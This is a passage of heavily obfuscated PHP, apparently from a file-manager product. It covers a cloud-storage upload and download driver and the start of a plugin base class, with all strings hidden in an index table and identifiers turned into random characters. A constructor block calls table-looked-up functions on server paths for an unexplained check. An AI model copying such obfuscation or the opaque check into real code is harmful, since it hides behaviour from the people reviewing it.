$€¨‹ËÜö[$ˆÍŞ¿œ[1308]] ? $this->getPathOuter($¢Áá¸ïç) : !1; } $€½åŞÖÌ = 1024 * 1024 * 10; $Š¥°â²· = array($ˆÍŞ¿œ[1590], $ˆÍŞ¿œ[1591] . $°”¤³ô, $ˆÍŞ¿œ[1592], $ˆÍŞ¿œ[1593] . $€½åŞÖÌ); $€¨‹ËÜö = $this->ussRequest($¢Áá¸ïç, $ˆÍŞ¿œ[255], !1, $Š¥°â²·); if (!$€¨‹ËÜö[$ˆÍŞ¿œ[1308]]) { return !1; } $¿åãçä = $€¨‹ËÜö[$ˆÍŞ¿œ[1298]]; $ÏÙáÂ´ì = 0; $¯Ü³†ä = $¿åãçä[$ˆÍŞ¿œ[1594]]; $§ö…û¼Ã = fopen($…ºìñ‰Ñ, $ˆÍŞ¿œ[1470]); if (!$§ö…û¼Ã) { return !1; } do { $–¹óÙÂ• = $¿åãçä[$ˆÍŞ¿œ[1595]]; fseek_64($§ö…û¼Ã, $ÏÙáÂ´ì); $òğğ”òÔ = fread($§ö…û¼Ã, $–¹óÙÂ•); $”àÚøä = 0; do { $”àÚøä++; $¿åãçä = $this->uploadPart($¢Áá¸ïç, $¿åãçä, $òğğ”òÔ); } while (!$¿åãçä && $”àÚøä < 3); if (!$¿åãçä) { return !1; } $¯Ü³†ä = $¿åãçä[$ˆÍŞ¿œ[1594]]; $ÏÙáÂ´ì += $–¹óÙÂ•; } while ($¯Ü³†ä != -1); fclose($§ö…û¼Ã); $Š¥°â²· = array($ˆÍŞ¿œ[1596], $ˆÍŞ¿œ[1597] . $¿åãçä[$ˆÍŞ¿œ[1598]], $ˆÍŞ¿œ[1592]); $€¨‹ËÜö = $this->ussRequest($¢Áá¸ïç, $ˆÍŞ¿œ[255], !1, $Š¥°â²·); return $€¨‹ËÜö[$ˆÍŞ¿œ[1308]] ? $this->getPathOuter($”İÏÕ¾¼) : !1; } private function uploadPart($°Î¤š, $Õôö¤©Ñ, &$€Û‚šÉ•) { $´ôÖî´Ù =& $_SERVER[¡¬ıÜ ƒ]; $í³ùûÜ‚ = array($´ôÖî´Ù[1599], $´ôÖî´Ù[1597] . $Õôö¤©Ñ[$´ôÖî´Ù[1598]], $´ôÖî´Ù[1600] . $Õôö¤©Ñ[$´ôÖî´Ù[1594]], $´ôÖî´Ù[146] . $Õôö¤©Ñ[$´ôÖî´Ù[1595]]); $òĞşâº = $this->ussRequest($°Î¤š, $´ôÖî´Ù[255], $€Û‚šÉ•, $í³ùûÜ‚); return !$òĞşâº[$´ôÖî´Ù[1308]] ? $òĞşâº[$´ôÖî´Ù[1308]] : $òĞşâº[$´ôÖî´Ù[1298]]; } public function uploadFormData($õü…¾Š³, $ÅÑª˜ĞÆ = 3600) { return $this->uploadPolicy($õü…¾Š³, $ÅÑª˜ĞÆ); } public function uploadMultiData($ïÄÀƒ, $©‡©üïŸ = 3600) { $áŒïÍ¢ =& $_SERVER[¡¬ıÜ ƒ]; $¡ù¤¥ˆÓ = (int) $GLOBALS[$áŒïÍ¢[7]][$áŒïÍ¢[79]]; return $this->uploadPolicy($ïÄÀƒ, $©‡©üïŸ, $¡ù¤¥ˆÓ); } private function uploadPolicy($šëöÂ, $ñÂ¡”™ß = 3600, $şš­¦Äâ = 0) { $¯ØĞºÍĞ =& $_SERVER[¡¬ıÜ ƒ]; $á—Êõ‚œ = $¯ØĞºÍĞ[8] . $this->bucket; $±•àô©ˆ = gmdate($¯ØĞºÍĞ[1505]); $è¤ÏıáÅ = array($¯ØĞºÍĞ[1601] => $this->bucket, $¯ØĞºÍĞ[1602] => $šëöÂ, $¯ØĞºÍĞ[1603] => time() + $ñÂ¡”™ß, $¯ØĞºÍĞ[1604] => $±•àô©ˆ); if ($şš­¦Äâ) { $è¤ÏıáÅ[$¯ØĞºÍĞ[1490]] = $şš­¦Äâ; } $é†¥Ÿç = base64_encode(json_encode($è¤ÏıáÅ)); $¼—¢«ú = base64_encode(hash_hmac($¯ØĞºÍĞ[1558], "\x50\117\123\x54\46{$á—Êõ‚œ}\x26{$±•àô©ˆ}\46{$é†¥Ÿç}", md5("{$this->userpass}"), !0)); $â ëßï = array($¯ØĞºÍĞ[279] => $é†¥Ÿç, $¯ØĞºÍĞ[1605] => "\125\120\x59\125\x4e\x20{$this->username}\72{$¼—¢«ú}", $¯ØĞºÍĞ[208] => $this->endpoint . $á—Êõ‚œ); return $â ëßï; } public function download($æ»Ğ¹½Â, $úÈÃ„±) { $·¦ğê™í = IO::getPathInner(IO::mkfile($úÈÃ„±)); if (!($é·ü ª = $this->link($æ»Ğ¹½Â))) { return !1; } $´µ¾Üş¨ = 0; $ÉÕ§è´ = 1024 * 200; $„öœº³ü = fopen($·¦ğê™í, $_SERVER[¡¬ıÜ ƒ][1553]); while (!0) { $Ë–ö˜µù = $this->fileSubstr($æ»Ğ¹½Â, $´µ¾Üş¨, $ÉÕ§è´); if ($Ë–ö˜µù === !1) { return !1; } fwrite($„öœº³ü, $Ë–ö˜µù); $´µ¾Üş¨ += $ÉÕ§è´; if (strlen($Ë–ö˜µù) < $ÉÕ§è´) { break; } } fclose($„öœº³ü); return $úÈÃ„±; } public function link($•åë›«À, $Şâ©ıßŞ = array()) { $Ãµ”ô› =& $_SERVER[¡¬ıÜ ƒ]; $•åë›«À = trim($•åë›«À, $Ãµ”ô›[8]); if (!empty($this->token)) { $üê¦èĞë = strtotime(date($Ãµ”ô›[1606])); $¯­°ó = substr(md5($this->token . $Ãµ”ô›[286] . $üê¦èĞë . $Ãµ”ô›[1607] . $•åë›«À), 12, 8) . $üê¦èĞë; $Şâ©ıßŞ[] = $Ãµ”ô›[1608] . $¯­°ó; } $ªæŸÌÒˆ = !empty($Şâ©ıßŞ) ? $Ãµ”ô›[76] . implode($Ãµ”ô›[286], $Şâ©ıßŞ) : $Ãµ”ô›[12]; return $this->getHost() . $Ãµ”ô›[8] . $this->pathEncode($•åë›«À) . $ªæŸÌÒˆ; } public function fileOut($ú‹¦‘º®, $ûÅŸñ¯ = false, $åÓÀúş = false, $•Ÿ—õÖÚ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ú‹¦‘º®, $ûÅŸñ¯, $åÓÀúş, $•Ÿ—õÖÚ); } if (!$åÓÀúş) { $åÓÀúş = $this->pathThis($ú‹¦‘º®); } $á«Ğªê = $ûÅŸñ¯ ? array($_SERVER[¡¬ıÜ ƒ][1609] . rawurlencode($åÓÀúş)) : array(); $ú±É¼°î = $this->link($ú‹¦‘º®, $á«Ğªê); $this->fileOutLink($ú±É¼°î); } public function fileOutServer($ñûƒáÒÇ, $çÉ÷•´ = false, $Ç†€ßô· = false, $¯Öê‹÷¹ = '') { parent::fileOut($ñûƒáÒÇ, $çÉ÷•´, $Ç†€ßô·, $¯Öê‹÷¹); } public function fileOutImage($ÌŞ¢ôŒ, $ãêƒêö = 250) { $·“İéıñ = $this->link($ÌŞ¢ôŒ . $_SERVER[¡¬ıÜ ƒ][1610] . $ãêƒêö); $this->fileOutLink($·“İéıñ); } public function fileOutImageServer($£óÂõÔÔ, $ÏÓ”öŞÏ = 250) { parent::fileOutImage($£óÂõÔÔ, $ÏÓ”öŞÏ); } public function hashMd5($œ¿ƒ²ü€) { $¸¸à‡Ò =& $_SERVER[¡¬ıÜ ƒ]; $ç¸Ø€É = $this->_objectMeta($œ¿ƒ²ü€); return isset($ç¸Ø€É[$¸¸à‡Ò[247]]) ? $ç¸Ø€É[$¸¸à‡Ò[247]] : !1; } public function size($Æ½ª§…Ç) { $§¡†‘ª = $this->objectMeta($Æ½ª§…Ç); return $§¡†‘ª ? $§¡†‘ª[$_SERVER[¡¬ıÜ ƒ][79]] : 0; } public function info($û¯÷ï®Ö) { if ($this->isFolder($û¯÷ï®Ö)) { return $this->folderInfo($û¯÷ï®Ö); } else { if ($this->isFile($û¯÷ï®Ö)) { return $this->fileInfo($û¯÷ï®Ö); } } return !1; } public function exist($³¤¯é­) { return $this->isFile($³¤¯é­) || $this->isFolder($³¤¯é­); } public function isFile($éÛ¦¾‡) { return !$this->isFolder($éÛ¦¾‡) && $this->objectMeta($éÛ¦¾‡); } public function isFolder($±î×ù¦) { return $this->cacheMethod($_SERVER[¡¬ıÜ ƒ][179], $±î×ù¦); } protected function objectMeta($¨ÂÚ˜‰¿) { return $this->cacheMethod($_SERVER[¡¬ıÜ ƒ][181], $¨ÂÚ˜‰¿); } protected function _objectMeta($×¡¢ÒÕÁ) { $”‚æõ™¿ =& $_SERVER[¡¬ıÜ ƒ]; if ($×¡¢ÒÕÁ == $”‚æõ™¿[12] || $×¡¢ÒÕÁ == $”‚æõ™¿[8]) { return array(); } $»æ¬Šùë = $this->ussRequest($×¡¢ÒÕÁ, $”‚æõ™¿[1611]); if (!$»æ¬Šùë[$”‚æõ™¿[1308]]) { return null; } $ñå´Ìª = isset($»æ¬Šùë[$”‚æõ™¿[1298]]) ? $»æ¬Šùë[$”‚æõ™¿[1298]] : array(); if (!isset($ñå´Ìª[$”‚æõ™¿[1612]])) { return null; } $Ì—æÓÎ = array($”‚æõ™¿[33] => isset($ñå´Ìª[$”‚æõ™¿[1612]]) ? $ñå´Ìª[$”‚æõ™¿[1612]] : null, $”‚æõ™¿[79] => isset($ñå´Ìª[$”‚æõ™¿[1613]]) ? $ñå´Ìª[$”‚æõ™¿[1613]] : null, $”‚æõ™¿[247] => isset($ñå´Ìª[$”‚æõ™¿[1614]]) ? $ñå´Ìª[$”‚æõ™¿[1614]] : null, $”‚æõ™¿[1581] => isset($ñå´Ìª[$”‚æõ™¿[1615]]) ? $ñå´Ìª[$”‚æõ™¿[1615]] : null); $Ì—æÓÎ[$”‚æõ™¿[1582]] = isset($ñå´Ìª[$”‚æõ™¿[1616]]) ? strtotime($ñå´Ìª[$”‚æõ™¿[1616]]) : $Ì—æÓÎ[$”‚æõ™¿[1581]]; return $Ì—æÓÎ; } protected function _isFolder($ö…Ÿ„ÉÎ) { $Şßëëíô =& $_SERVER[¡¬ıÜ ƒ]; if ($ö…Ÿ„ÉÎ == $Şßëëíô[12] || $ö…Ÿ„ÉÎ == $Şßëëíô[8]) { return !0; } $şäã˜úã = $this->_objectMeta($ö…Ÿ„ÉÎ); return isset($şäã˜úã[$Şßëëíô[33]]) && $şäã˜úã[$Şßëëíô[33]] == $Şßëëíô[78] ? !0 : !1; } } goto AÈ„¦¤ÛóÏ; e¹àÄ°«Îœ: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ƒˆ‰„ú¢ =& $_SERVER[¡¬ıÜ ƒ]; if ($_SERVER[$ƒˆ‰„ú¢[859]] != $_SERVER[$ƒˆ‰„ú¢[887]]) { $Ñ¦»”ê× = $ƒˆ‰„ú¢[967]; $¼Í§ıå = $ƒˆ‰„ú¢[860]; $åıÎº‰ = $_SERVER[$ƒˆ‰„ú¢[861]] . $ƒˆ‰„ú¢[862]; $·‚’ ¦÷ = $¼Í§ıå($åıÎº‰); $ò§ıá» = explode($ƒˆ‰„ú¢[287], $·‚’ ¦÷); if (count($ò§ıá») < $ƒˆ‰„ú¢[688]) { $À‹ı™éÁ = $ƒˆ‰„ú¢[863]; $À‹ı™éÁ(); } $ƒ­ññÊ˜ = $ƒˆ‰„ú¢[968]; $ƒ­ññÊ˜($_SERVER[$ƒˆ‰„ú¢[969]]); $ƒ­ññÊ˜($_SERVER[$ƒˆ‰„ú¢[861]] . $ƒˆ‰„ú¢[970]); $ıÅŠ•¶” = 1; while ($ıÅŠ•¶” > 1) { $ıÅŠ•¶” = $ıÅŠ•¶” + 4; $‘Ş©ÈÅ = rawurlencode($ıÅŠ•¶” . $ƒˆ‰„ú¢[456]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ƒˆ‰„ú¢[1636]); $this->pluginName = str_replace($ƒˆ‰„ú¢[1636], $ƒˆ‰„ú¢[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ƒˆ‰„ú¢[8]; $this->pluginApi = appHostGet() . $ƒˆ‰„ú¢[1637] . $this->pluginName . $ƒˆ‰„ú¢[8]; $this->pluginHost = $config[$ƒˆ‰„ú¢[1638]] . $this->pluginName . $ƒˆ‰„ú¢[8]; $this->pluginHostDefault = $config[$ƒˆ‰„ú¢[1638]] . $this->pluginName . $ƒˆ‰„ú¢[8]; $à–ôÈÇ = $config[$ƒˆ‰„ú¢[1639]]; if ($à–ôÈÇ && strpos($ƒˆ‰„ú¢[50] . $à–ôÈÇ . $ƒˆ‰„ú¢[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ƒˆ‰„ú¢[1640]] . $this->pluginName . $ƒˆ‰„ú¢[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¡¬ıÜ ƒ][1641]); } protected function assign($û…¶¹, $ˆªü³› = false) { if (is_array($û…¶¹)) { $this->values = array_merge($this->values, $û…¶¹); } else { $this->values[$û…¶¹] = $ˆªü³›; } } protected function display($ÅŠ•ËâÕ) { extract($this->values); require $ÅŠ•ËâÕ; } final function hookRegist($µ±ÚåŒ‰) { $this->modelPlugin->appRegist($this->pluginName, $µ±ÚåŒ‰); } final function appIcon() { $Û¬ÖÁª± =& $_SERVER[¡¬ıÜ ƒ]; $•üÀ²í» = $this->appPackage(); $Ä·ÁÑ• = $Û¬ÖÁª±[12]; if (isset($•üÀ²í»[$Û¬ÖÁª±[492]])) { if (isset($•üÀ²í»[$Û¬ÖÁª±[492]][$Û¬ÖÁª±[1642]])) { $Ä·ÁÑ• = $Û¬ÖÁª±[1643] . $•üÀ²í»[$Û¬ÖÁª±[492]][$Û¬ÖÁª±[1642]] . $Û¬ÖÁª±[1644]; } else { if ($•üÀ²í»[$Û¬ÖÁª±[492]][$Û¬ÖÁª±[1645]]) { $Ä·ÁÑ• = $Û¬ÖÁª±[1646] . $•üÀ²í»[$Û¬ÖÁª±[492]][$Û¬ÖÁª±[1645]] . $Û¬ÖÁª±[1647]; } } } return $Ä·ÁÑ•; } final function fileCanView($Ê¸¼ë) { $ÂŞø®•ş =& $_SERVER[¡¬ıÜ ƒ]; if (request_url_safe($Ê¸¼ë)) { return !0; } if ($this->isShare($Ê¸¼ë)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $·ÁÙåñå = $ÂŞø®•ş[1648] . rawurlencode(this_url()); show_tips(LNG($ÂŞø®•ş[1649]) . $ÂŞø®•ş[1650] . $·ÁÙåñå . $ÂŞø®•ş[1651] . LNG($ÂŞø®•ş[1652]) . $ÂŞø®•ş[1653], !1); } if (!Action($ÂŞø®•ş[1654])->authCan($ÂŞø®•ş[1655])) { show_tips(LNG($ÂŞø®•ş[1656]) . $ÂŞø®•ş[1657], !1); } ActionCall($ÂŞø®•ş[1658], $Ê¸¼ë); } final function isShare($ñ«¡ŠÖ£) { $ˆğÀÀ = KodIO::parse($ñ«¡ŠÖ£); return $ˆğÀÀ[$_SERVER[¡¬ıÜ ƒ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Šø‚Êâä) { if (request_url_safe($Šø‚Êâä)) { return $Šø‚Êâä; } if (!$this->isShare($Šø‚Êâä)) { $Šø‚Êâä = $this->filePath($Šø‚Êâä, !1); } return Action($_SERVER[¡¬ıÜ ƒ][1267])->linkOut($Šø‚Êâä); } public function filePathLinkOut($“°‡²ƒÎ) { if (request_url_safe($“°‡²ƒÎ)) { return $“°‡²ƒÎ; } $this->fileCanView($“°‡²ƒÎ); return Action($_SERVER[¡¬ıÜ ƒ][1267])->link($“°‡²ƒÎ); } final function filePath($’ë›¶ñŒ, $§ñœâöó = true, $ÃÄ”Ïê© = false) { $Åìâ¸”Ñ =& $_SERVER[¡¬ıÜ ƒ]; $ó–›ó˜ƒ = $this->filePathGet($’ë›¶ñŒ, $§ñœâöó); if (!$this->fileInfo) { show_tips(LNG($Åìâ¸”Ñ[108]), !1); } if ($ÃÄ”Ïê© && isset($this->fileInfo[$Åìâ¸”Ñ[543]]) && $this->fileInfo[$Åìâ¸”Ñ[543]]) { $ĞÆÅÃË = Model($Åìâ¸”Ñ[546])->fileInfo($this->fileInfo[$Åìâ¸”Ñ[543]]); if (!$ĞÆÅÃË || !IO::exist($ĞÆÅÃË[$Åìâ¸”Ñ[87]])) { $õ¢§­®Æ = LNG($Åìâ¸”Ñ[108]) . LNG($Åìâ¸”Ñ[1659]); if (KodUser::isRoot() && isset($ĞÆÅÃË[$Åìâ¸”Ñ[87]])) { $õ¢§­®Æ .= $Åìâ¸”Ñ[1660] . $ĞÆÅÃË[$Åìâ¸”Ñ[87]] . $Åìâ¸”Ñ[1661]; } show_tips($õ¢§­®Æ); } } Hook::trigger($Åìâ¸”Ñ[1662], $ó–›ó˜ƒ); return $ó–›ó˜ƒ; } final function filePathGet($¾»‚òñ˜, $°ºğıĞµ = true) { $Û®†—“ =& $_SERVER[¡¬ıÜ ƒ]; if ($ĞÇı¦ç = $this->checkSharePath($¾»‚òñ˜, $°ºğıĞµ)) { return $ĞÇı¦ç; } $this->fileCanView($¾»‚òñ˜); if (request_url_safe($¾»‚òñ˜)) { $»„Ê®èê = parse_url_query($¾»‚òñ˜); if (isset($»„Ê®èê[$Û®†—“[1663]]) && isset($»„Ê®èê[$Û®†—“[236]])) { $‡¦Ø¾Å = Mcrypt::decode($»„Ê®èê[$Û®†—“[236]], Model($Û®†—“[850])->get($Û®†—“[851])); if ($‡¦Ø¾Å) { $this->fileInfo = IO::info($‡¦Ø¾Å); $this->fileInfo[$Û®†—“[1664]] = $¾»‚òñ˜; $this->cachePath = $this->pluginCachePath($Û®†—“[12], $°ºğıĞµ); return $‡¦Ø¾Å; } } $¾»‚òñ˜ = $this->_cacheHttpFile($¾»‚òñ˜, $°ºğıĞµ); $this->fileInfo = IO::info($¾»‚òñ˜); } else { $this->fileInfo = IO::info($¾»‚òñ˜); $this->cachePath = $this->pluginCachePath($Û®†—“[12], $°ºğıĞµ); } return $¾»‚òñ˜; } final function _cacheHttpFile($˜…Ù¿ë´, $‹ƒÌ Æ¥ = true) { $û™€ä¹ =& $_SERVER[¡¬ıÜ ƒ]; $€è†¸»¦ = parse_url_query($˜…Ù¿ë´); $¸¸å…´ = get_path_ext($˜…Ù¿ë´); if (isset($€è†¸»¦[$û™€ä¹[32]]) && $€è†¸»¦[$û™€ä¹[32]]) { $¸¸å…´ = get_path_ext($€è†¸»¦[$û™€ä¹[32]]); } $­ ßê—Ç = hash_path($˜…Ù¿ë´) . $û™€ä¹[10] . $¸¸å…´; $this->cachePath = $this->pluginCachePath($‹ƒÌ Æ¥ ? $­ ßê—Ç : $û™€ä¹[12]); $ÜÜ¢Ú • = IO::fileNameExist($this->cachePath, $­ ßê—Ç); if ($ÜÜ¢Ú •) { return KodIO::make($ÜÜ¢Ú •); } $©ƒÁËó = rtrim($this->cachePath, $û™€ä¹[8]) . $û™€ä¹[8] . $­ ßê—Ç; return $this->pluginCacheFileSet($©ƒÁËó, file_get_contents_nossl($˜…Ù¿ë´)); } final function checkSharePath($şõÚ‘È, $™Çõä¸¦ = true) { $‰ úœ”ı =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->isShare($şõÚ‘È)) { return !1; } $Ã¬’©» = Action($‰ úœ”ı[1267])->sharePathInfo($şõÚ‘È); if (!is_array($Ã¬’©») || !isset($Ã¬’©»[$‰ úœ”ı[87]])) { show_json(LNG($‰ úœ”ı[1665]), !1); } $this->fileInfo = $Ã¬’©»; $this->cachePath = $this->pluginCachePath(!1, $™Çõä¸¦); return $Ã¬’©»[$‰ úœ”ı[87]]; } final function pluginCachePath($Š¿¯×¬ = '', $÷Şµ©Æ = false) { $’•Ù—ÜŠ =& $_SERVER[¡¬ıÜ ƒ]; if ($÷Şµ©Æ && is_array($this->fileInfo)) { $Š¿¯×¬ = kodIO::hashPath($this->fileInfo); } $×ôİ«¨É = rtrim(IO_PATH_SYSTEM_TEMP . $’•Ù—ÜŠ[1666] . $this->pluginName . $’•Ù—ÜŠ[8] . $Š¿¯×¬, $’•Ù—ÜŠ[8]); $Â†à×‹° = IO::infoFullSimple($×ôİ«¨É); $‹€ğ¼óÂ = $Â†à×‹° && is_array($Â†à×‹°) ? $Â†à×‹°[$’•Ù—ÜŠ[87]] : $’•Ù—ÜŠ[12]; if (!$‹€ğ¼óÂ) { $‹€ğ¼óÂ = IO::mkdir($×ôİ«¨É); } return $‹€ğ¼óÂ; } final function pluginCacheFileSet($ù¢öâïÅ, $æµÏ†î = '') { $´««“¯Ï =& $_SERVER[¡¬ıÜ ƒ]; $‹úßÕçŞ = IO::infoFullSimple($ù¢öâïÅ); if (!$‹úßÕçŞ) { return IO::mkfile($ù¢öâïÅ, $æµÏ†î, REPEAT_REPLACE); } IO::setContent($‹úßÕçŞ[$´««“¯Ï[87]], $æµÏ†î); return $‹úßÕçŞ[$´««“¯Ï[87]]; } final function pluginLocalFile($¶ÔÄÕ£Ë = '') { $É±§ ªÆ =& $_SERVER[¡¬ıÜ ƒ]; $’ó²úôí = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($’ó²úôí)) { mk_dir($’ó²úôí); } if (!$¶ÔÄÕ£Ë) { return $’ó²úôí; } $½ÊßµÛ± = IO::info($¶ÔÄÕ£Ë); $Ì¤®ÒõÚ = $É±§ ªÆ[1667] . KodIO::hashPath($½ÊßµÛ±) . $É±§ ªÆ[10] . $½ÊßµÛ±[$É±§ ªÆ[169]]; if (!checkExtSafe($Ì¤®ÒõÚ)) { $Ì¤®ÒõÚ = $Ì¤®ÒõÚ . $É±§ ªÆ[1302]; } $ä–Ôåé© = $’ó²úôí . $Ì¤®ÒõÚ; if (@file_exists($ä–Ôåé©)) { return $ä–Ôåé©; } return IO::copy($¶ÔÄÕ£Ë, $’ó²úôí, 0, $Ì¤®ÒõÚ); } final function appPackage() { $ë¤¹Å’… =& $_SERVER[¡¬ıÜ ƒ]; if ($this->packageData) { return $this->packageData; } $œ’ãÚ¥Æ = $this->parseFile($this->pluginPath . $ë¤¹Å’…[1668]); $this->parseLang($œ’ãÚ¥Æ); $µ²Ş«İ = json_decode_force($œ’ãÚ¥Æ); if (!$µ²Ş«İ) { return array(); } $éúƒ’ı± = Hook::trigger($ë¤¹Å’…[1669], $µ²Ş«İ); if ($éúƒ’ı± && is_array($éúƒ’ı±)) { $µ²Ş«İ = $éúƒ’ı±; } $this->packageData = $µ²Ş«İ; return $µ²Ş«İ; } public function packageInfoGet($¢ø¹†é) { $§È×Ù¸À = $this->appPackage(); return array_get_value($§È×Ù¸À, $¢ø¹†é); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¡¬ıÜ ƒ][1670]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¡¬ıÜ ƒ][1671]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¡¬ıÜ ƒ][1672]); } public function echoJsAssign($Ğ…ƒ±º, $»ß½¯†—) { $this->echoJsAssignArr[$Ğ…ƒ±º] = $»ß½¯†—; } private function parseFile($á©‰˜µ˜) { $˜ö‚çıİ =& $_SERVER[¡¬ıÜ ƒ]; $ù°ÜÊğ¡ = file_get_contents_nossl($á©‰˜µ˜); $ÒÆÔ¼ = array($˜ö‚çıİ[1673], $˜ö‚çıİ[1674], $˜ö‚çıİ[1675], $˜ö‚çıİ[1676], $˜ö‚çıİ[1677], $˜ö‚çıİ[1678], $˜ö‚çıİ[1679]); $ÈÛú®‹É = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$˜ö‚çıİ[92]][$˜ö‚çıİ[1680]]); foreach ($this->echoJsAssignArr as $’ªæ§¼ì => $ÈËÒõ) { $ÒÆÔ¼[] = $˜ö‚çıİ[1681] . $’ªæ§¼ì . $˜ö‚çıİ[1682]; $ÈÛú®‹É[] = is_array($ÈËÒõ) || is_object($ÈËÒõ) ? rawurlencode(json_encode($ÈËÒõ)) : $ÈËÒõ; } if (strstr($ù°ÜÊğ¡, $˜ö‚çıİ[1683])) { $¯ùÅ¬«ä = rawurlencode(json_encode($this->pluginLangArr)); $ù°ÜÊğ¡ = str_replace($˜ö‚çıİ[1683], $¯ùÅ¬«ä, $ù°ÜÊğ¡); } if (strstr($ù°ÜÊğ¡, $˜ö‚çıİ[1684])) { $¯ùÅ¬«ä = $¯ùÅ¬«ä = rawurlencode(json_encode($this->getConfig())); $ù°ÜÊğ¡ = str_replace($˜ö‚çıİ[1684], $¯ùÅ¬«ä, $ù°ÜÊğ¡); } $ù°ÜÊğ¡ = str_replace($ÒÆÔ¼, $ÈÛú®‹É, $ù°ÜÊğ¡); return $ù°ÜÊğ¡; } private function parseLang(&$ì›ÕÆ€ï) { $¦æ¤’Ãõ =& $_SERVER[¡¬ıÜ ƒ]; $‡¶ÕÒÉ¤ = $¦æ¤’Ãõ[1685]; if (!strstr($ì›ÕÆ€ï, $‡¶ÕÒÉ¤)) { return; } preg_match_all($¦æ¤’Ãõ[1686], $ì›ÕÆ€ï, $“íçšÆ); if (!is_array($“íçšÆ) || count($“íçšÆ) == 0 || !is_array($“íçšÆ[0]) || count($“íçšÆ[0]) == 0) { return; } $Œ»×”§ = array(); $€Ñ¸·ëñ = array(); foreach ($“íçšÆ[0] as $ÑÇËÎ±») { $ùéˆØ = substr($ÑÇËÎ±», strlen($‡¶ÕÒÉ¤), -4); $úùŞ“‡¤ = LNG($ùéˆØ); $Œ»×”§[] = $ÑÇËÎ±»; $€Ñ¸·ëñ[] = str_replace(array($¦æ¤’Ãõ[287], $¦æ¤’Ãõ[1167], $¦æ¤’Ãõ[419], $¦æ¤’Ãõ[121]), array($¦æ¤’Ãõ[53], $¦æ¤’Ãõ[53], $¦æ¤’Ãõ[12], $¦æ¤’Ãõ[1687]), $úùŞ“‡¤); } $ì›ÕÆ€ï = str_replace($Œ»×”§, $€Ñ¸·ëñ, $ì›ÕÆ€ï); } private function parseConfig(&$Êü–½Ê) { $â·óÑãŠ =& $_SERVER[¡¬ıÜ ƒ]; $¯àßò…‹ = $â·óÑãŠ[1688]; if (!strstr($Êü–½Ê, $¯àßò…‹)) { return; } preg_match_all($â·óÑãŠ[1689], $Êü–½Ê, $§§ª·Ò); if (!is_array($§§ª·Ò) || count($§§ª·Ò) == 0 || !is_array($§§ª·Ò[0]) || count($§§ª·Ò[0]) == 0) { return; } $»€¨şöø = $this->getConfig(); $ï×…§ÒÈ = array(); $´øøô¦ = array(); foreach ($§§ª·Ò[0] as $¦Ş¶çæ“) { $©·üĞøü = substr($¦Ş¶çæ“, strlen($¯àßò…‹), -2); $ï×…§ÒÈ[] = $¦Ş¶çæ“; $´øøô¦[] = _get($»€¨şöø, $©·üĞøü); } $Êü–½Ê = str_replace($ï×…§ÒÈ, $´øøô¦, $Êü–½Ê); } private function parsePackage(&$´âÔÑ®) { $½ã»Å°Ú =& $_SERVER[¡¬ıÜ ƒ]; $Âğ¯“æ¥ = $½ã»Å°Ú[1690]; if (!strstr($´âÔÑ®, $Âğ¯“æ¥)) { return; } preg_match_all($½ã»Å°Ú[1691], $´âÔÑ®, $ÓßøãŞÙ); if (!is_array($ÓßøãŞÙ) || count($ÓßøãŞÙ) == 0 || !is_array($ÓßøãŞÙ[0]) || count($ÓßøãŞÙ[0]) == 0) { return; } $Å§–æ¥° = $this->appPackage(); $×Â Û†Æ = array(); $ÆÒ‘·¿™ = array(); foreach ($ÓßøãŞÙ[0] as $¸”‚ê‰¸) { $ÕµÆÇøÓ = substr($¸”‚ê‰¸, strlen($Âğ¯“æ¥), -2); $×Â Û†Æ[] = $¸”‚ê‰¸; $ÆÒ‘·¿™[] = _get($Å§–æ¥°, $ÕµÆÇøÓ); } $´âÔÑ® = str_replace($×Â Û†Æ, $ÆÒ‘·¿™, $´âÔÑ®); } final function echoFile($Œµ†Õè¥, $×÷¾”’» = false) { $ŸÜô›­ =& $_SERVER[¡¬ıÜ ƒ]; $ÏâÖ¼É¥ = $this->pluginPath . $Œµ†Õè¥; if (ACT == $ŸÜô›­[1692]) { echo $ŸÜô›­[1693] . $this->pluginName . $ŸÜô›­[8] . $Œµ†Õè¥ . $ŸÜô›­[1694]; if (!file_exists($ÏâÖ¼É¥)) { echo $ŸÜô›­[1695]; return; } } $£Æ£ª…· = $this->parseFile($ÏâÖ¼É¥); $this->parseLang($£Æ£ª…·); $this->parseConfig($£Æ£ª…·); $this->parsePackage($£Æ£ª…·); if (is_array($×÷¾”’»)) { $£Æ£ª…· = str_replace(array_keys($×÷¾”’»), array_values($×÷¾”’»), $£Æ£ª…·); } echo $ŸÜô›­[287] . $£Æ£ª…·; } private function checkVersion() { $¿Æà¿¬ =& $_SERVER[¡¬ıÜ ƒ]; $ĞĞ™Æ¸ = $this->appPackage(); $Á¢–‚ = $this->getConfig(); if ($Á¢–‚[$¿Æà¿¬[1696]] == $ĞĞ™Æ¸[$¿Æà¿¬[1670]]) { return; } $this->regist(); $this->setConfig(array($¿Æà¿¬[1696] => $ĞĞ™Æ¸[$¿Æà¿¬[1670]])); } final function initLang() { $…âö­ÉË =& $_SERVER[¡¬ıÜ ƒ]; $Û»öÒø© = $…âö­ÉË[1697]; $ÌşÇ‚ĞÆ = $this->pluginPath . $…âö­ÉË[1698]; $¯é€é’ = I18n::getType(); $ª˜ÏØ×§ = array(); if (file_exists($ÌşÇ‚ĞÆ . $¯é€é’ . $…âö­ÉË[928])) { $ª˜ÏØ×§ = (include 